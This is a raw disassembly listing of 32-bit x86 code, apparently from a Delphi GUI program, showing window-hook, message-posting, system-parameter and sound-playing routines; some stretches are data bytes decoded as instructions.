add [ eax + eax - 0x80 ] 0xf8
inc esp
add ah bh
xor [ edi ] eax
mov eax 0x100044f5
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add al ah
push ss
inc edi
add [ ecx + edx * 4 - 0x23fbffbc ] dl
inc edi
add [ eax ] bl
sbb [ edi ] al
and [ ebx - 0x9f3ffbc ] dh
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ eax + 0x26 ] ch
inc edi
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
sub_46eea6
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x140047e3
rol [ edi ] 0x4
xor eax 0x25d40047
inc edi
add [ eax ] bh
inc edi
add [ eax ] ah
int 0x47
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
hlt
sub_46f00e
inc esi
add [ ecx + eax + 0x4fa40000 ] cl
inc ebx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
hlt
sub_46f20a
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x140047e3
rol [ edi ] 0xf8
rol [ edi ] 0xf4
cmp eax 0x471c0047
inc edi
add [ eax ] ah
int 0x47
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
hlt
sub_46f37c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xf4
inc esi
add [ eax ] al
cmc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
hlt
sub_46f662
fdivp st7
adc esi [ eax - 0x2c002b ]
jmp r-xdata
inc [ eax + 0x7c00475c ]
push edi
inc edi
add [ eax ] bh
pop ecx
inc edi
add [ eax + ebx * 2 + 0x47 ] cl
add [ eax + 0x5b ] cl
inc edi
add [ esp + ebx * 2 ] al
inc edi
add [ edi + edx * 2 + 0x54110047 ] bl
inc ebx
jne r-xdata
cld
je r-xdata
or eax 0x33840042
inc eax
add al bh
inc eax
add ah bh
insd
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jne r-xdata
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ecx * 2 - 0x4f27ffb9 ] dh
inc esp
je r-xdata
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
mov ah 0x49
inc edi
add al bl
mov al 0x44
clc
outsb
mov eax eax
mov al [ 0x70046f6 ]
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
insd
dec ebp
rol [ ecx ] 0x1
add [ eax ] al
js r-xdata
jne r-xdata
clc
inc esi
add [ eax ] dl
clc
inc esi
add al dl
add [ eax ] eax
add [ eax - 0xd ] bh
inc esi
add [ esp + edx + 0x337c0042 ] bh
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
mov al [ 0x540044b0 ]
test [ eax + eax - 0x40 ] al
je r-xdata
lea eax [ ecx ]
outsb
je r-xdata
outsb
jne r-xdata
inc esi
add [ edi + eax * 8 + 0x46 ] dh
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
add [ ecx + ecx * 2 ] cl
inc edi
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 + 0x34440044 ] cl
inc edi
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x7abfffbc ] ch
inc esp
add [ edx * 4 + 0x4aec0044 ] cl
inc edi
add [ ecx + edx * 2 + 0x54300047 ] ah
inc edi
add [ eax ] bh
add eax 0x5780048
dec eax
add [ ecx + eax ] cl
dec eax
add al dl
int1
inc edi
add [ eax - 0xe ] ah
inc edi
add al al
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
add [ eax ] al
lea eax [ eax ]
sbb bh dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_46f858
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42bc7c
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46f8b4
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
mov [ esp ] eax
mov eax [ ebx + 0x8 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
mov eax esp
call sub_40d31c
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ esp ]
xor edx edx
mov [ eax + 0x2fc ] edx
xor edx edx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax ebx
call sub_42bc74
dec eax
jne r-xdata
mov eax esp
call sub_40d31c
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax ebx
call sub_46f8a8
add eax 0x2f8
push eax
mov eax [ esp + 0x4 ]
mov edx [ r-xdata ]
call sub_4032d8
pop edx
mov [ edx ] eax
jmp r-xdata
sub_46f954
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
stc
inc esi
add [ eax ] dl
add [ eax ] al
add [ esi + ebx * 2 + 0x41 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] bl
add [ eax + eax + 0x27800000 ] dh
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + eax * 4 - 0x78d7ffbf ] al
inc ecx
add [ eax - 0x4 ] al
inc esi
add al bl
test [ ecx ] eax
push esp
xchg [ ecx ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
fstp [ esi + 0x7 ]
jb r-xdata
add [ eax - 0x43ffb906 ] ah
pop edx
inc ebp
add [ eax + 0x14004210 ] dh
lea eax [ ecx ]
mov [ ecx ] dl
inc edx
add al dh
sub [ eax + eax - 0x74 ] al
push ebx
inc ebp
add [ eax - 0x2bffbaa0 ] bl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x29 ] ah
inc esp
add [ eax + 0x5c004217 ] bh
pop ss
inc edx
add [ eax - 0x5 ] ah
inc esi
add [ ebx + edi * 8 + 0x46 ] ah
add ah dl
cli
inc esi
add al ah
push esp
inc ebp
add al al
pop esi
inc ebp
add [ eax + 0x5e ] bl
inc ebp
add ah ch
popad
inc ebp
add [ eax + 0x12004428 ] bl
push esp
dec ecx
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0xfa04c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebx
retn
popad
insb
dec ebp
inc esp
dec ecx
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
je r-xdata
imul ebp [ edi + 0x6e ] 0x46fa7490
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x6e ]
je r-xdata
inc esi
or al 0x74
dec al
je r-xdata
jb r-xdata
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_44f7d8
push eax
push 0x223
mov eax [ ebx + 0xa0 ]
call sub_44f7d8
push eax
call GetParent
push eax
call SendMessageA
pop ebx
retn
dec al
je r-xdata
jmp r-xdata
popad
insb
dec ebp
inc esp
dec ecx
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add al 0xfa
inc esi
add [ eax + ebp ] dh
inc esp
add [ ebx ] dl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
mov eax [ ebx + 0xa0 ]
call sub_465de4
pop ebx
retn
stc
call [ eax - 0x18 ]
test eax 0x5bfff96e
retn
add [ eax ] al
mov eax eax
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455a6c
test bl bl
jle r-xdata
call sub_403128
pop esi
mov eax esi
call sub_4034dc
sub_46fb6c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x8 ]
sub eax 0x6
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub eax 0x14
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
call [ rw-data ]
sub_46fbd4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
pop ebx
retn
mov edx ebx
mov eax [ rw-data ]
call sub_41875c
inc eax
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4185a4
sub_46fc40
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test bl bl
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp [ esi + 0x8 ] 0x1
jne r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418968
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_46fb6c
push eax
push 0x4
call SetWindowsHookExA
mov [ rw-data ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
xor eax eax
mov [ rw-data ] eax
sub_46fca4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46e3d8
mov [ esi + 0x289 ] 0x1
xor edx edx
mov eax esi
call sub_42eb60
mov [ esi + 0x2c0 ] 0xfa0
mov [ esi + 0x2c8 ] 0x1
mov [ esi + 0x288 ] 0x1
mov eax esi
call sub_46fbd4
mov [ esi + 0x2d8 ] 0x96
mov [ esi + 0x2f0 ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ esi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46fd30
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_46fc14
mov eax [ esi + 0x2a8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x2f8 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47bfa4
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x2fc ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_46fd7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
push 0x0
push 0x1002
call SystemParametersInfoA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x2a8 ]
cmp [ eax + 0x288 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
push 0x0
push 0x1012
call SystemParametersInfoA
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x2ac ]
mov eax ebx
call sub_44894c
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x30 ]
call sub_448ac4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0xd ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xd ]
sub edx 0x5
cmp eax edx
setl al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
movzx edx [ edx - 0x9 ]
or eax [ edx * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x2d8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x9 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x80000
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x2d8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
sub_46febc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
add edi 0xfffffff8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x2a8 ]
cmp [ eax + 0x288 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
mov eax [ edi ]
mov ebx [ eax + 0x2ac ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417088
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov eax ebx
call sub_448ac4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0xd ] edx
mov eax [ edi ]
cmp [ eax + 0x289 ] 0x3
jne r-xdata
mov eax [ edi ]
mov ebx [ eax + 0x2ac ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_44894c
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_448ac4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0xd ] edx
mov edx [ ebx + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x2ac ]
mov esi [ eax + 0x30 ]
add edx [ esi + 0x44 ]
mov eax [ ebx + 0x40 ]
add eax [ esi + 0x40 ]
lea ecx [ ebp - 0x10 ]
call sub_417088
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0x11 ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0xd ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xd ]
mov edx [ edi ]
mov edx [ edx + 0x44 ]
add edx 0x2
cmp eax edx
setg al
and eax 0x7f
mov eax [ ebp + eax * 4 - 0x8 ]
mov edx [ ebp + 0x8 ]
movzx edx [ edx - 0x9 ]
or eax [ edx * 4 + rw-data ]
push eax
mov eax [ edi ]
mov eax [ eax + 0x2d8 ]
push eax
mov eax [ edi ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_470000
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c4 ]
cmp [ eax + 0x297 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x289 ]
dec al
je r-xdata
push ebp
call sub_46fd7c
pop ecx
jmp r-xdata
dec al
je r-xdata
push ebp
mov eax rw-data
call sub_46febc
pop ecx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2d8 ] 0x64
jle r-xdata
dec al
je r-xdata
push ebp
mov eax rw-data
call sub_46febc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub [ eax + 0x2d8 ] 0x64
push ebp
mov eax rw-data
call sub_46febc
pop ecx
mov eax [ ebp - 0x8 ]
add [ eax + 0x2d8 ] 0x64
jmp r-xdata
push ebp
mov eax rw-data
call sub_46febc
pop ecx
jmp r-xdata
sub_4700dc
push ebx
push esi
mov esi eax
cmp [ esi + 0x296 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x2b0 ] 0x0
je r-xdata
mov eax [ esi + 0x2b0 ]
call sub_42bc74
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
mov eax [ esi + 0x2b0 ]
call sub_46f8a8
mov edx [ eax ]
call [ edx + 0x17c ]
dec ebx
jne r-xdata
sub_470120
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x2c4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x2a8 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax + 0x28c ] edx
xor edx edx
call sub_47211c
mov [ ebx + 0x296 ] 0x0
mov esi [ ebx + 0x2c4 ]
test esi esi
je r-xdata
mov [ eax + 0x288 ] 0x0
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x2b0 ] 0x0
je r-xdata
mov eax [ esi + 0x2b0 ]
call sub_46f8a8
mov edi [ ebx + 0x2c4 ]
cmp eax edi
jne r-xdata
mov eax [ edi + 0x2b0 ]
call sub_46f8b4
mov [ ebx + 0x296 ] 0x0
mov eax ebx
call sub_470d18
test eax eax
je r-xdata
mov eax ebx
call sub_470d18
mov eax [ eax + 0x40 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
sub_4701b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
push 0x0
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
mov eax ebx
mov edx [ eax ]
call [ edx + 0x180 ]
sub_4701f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
push 0x0
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
mov eax ebx
mov edx [ eax ]
call [ edx + 0x180 ]
sub_47022c
push ebx
push esi
mov esi edx
mov edx esi
call sub_47c1a4
mov ebx eax
xor edx edx
mov eax ebx
call sub_4490fc
mov dl 0x1
mov eax esi
call sub_47b6fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor edx edx
jmp r-xdata
mov eax esi
call sub_47b0a8
test eax eax
jne r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov dl 0x1
mov eax esi
call sub_479bb4
test al al
je r-xdata
mov eax esi
call sub_479bf4
call sub_47a850
test eax eax
jg r-xdata
sub_47029c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_42bc74
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
mov eax [ eax + 0x2ac ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
call sub_479bf4
call sub_47a850
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x15c ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x170 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_44c070
xor edx edx
push ebp
push sub_4704b8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x12c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_44914c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x2c4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x224 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x224 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_471610
mov eax [ ebp - 0xc ]
mov [ eax + 0x296 ] 0x1
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2ac ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov bl [ eax + 0x30 ]
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
call sub_44cf0c
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x130 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4704bf
mov eax [ ebp - 0xc ]
call sub_44c078
retn
xor edx edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x164 ]
mov eax [ ebp - 0xc ]
call sub_47cf44
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
call sub_479bf4
cmp [ eax + 0x2a ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x295 ] bl
test bl bl
je r-xdata
sub_4704bf
mov eax [ ebp - 0xc ]
call sub_4494dc
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x300 ]
call sub_433a38
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
sub_470518
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x28c ] eax
mov eax [ ebx + 0x2c4 ]
mov [ eax + 0x28c ] esi
jmp r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_433a38
mov eax ebx
call sub_470d18
mov esi eax
mov eax ebx
call sub_47cf44
cmp esi eax
je r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x304 ]
mov dl 0x1
call sub_433a38
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx eax
xor dl 0x1
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x300 ]
call sub_433a38
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x300 ]
mov [ eax + 0xc ] 0x1
sub_4705d0
push ebx
mov ebx eax
test edx edx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
push 0x2
push 0x0
call sndPlaySoundA
push 0x13
push r-xdata
call sndPlaySoundA
mov eax [ ebx + 0x2f4 ]
mov eax [ eax + 0x38 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_470620
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x168 ]
mov [ esp ] eax
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_470654
push ebx
push esi
push edi
push ebp
push ecx
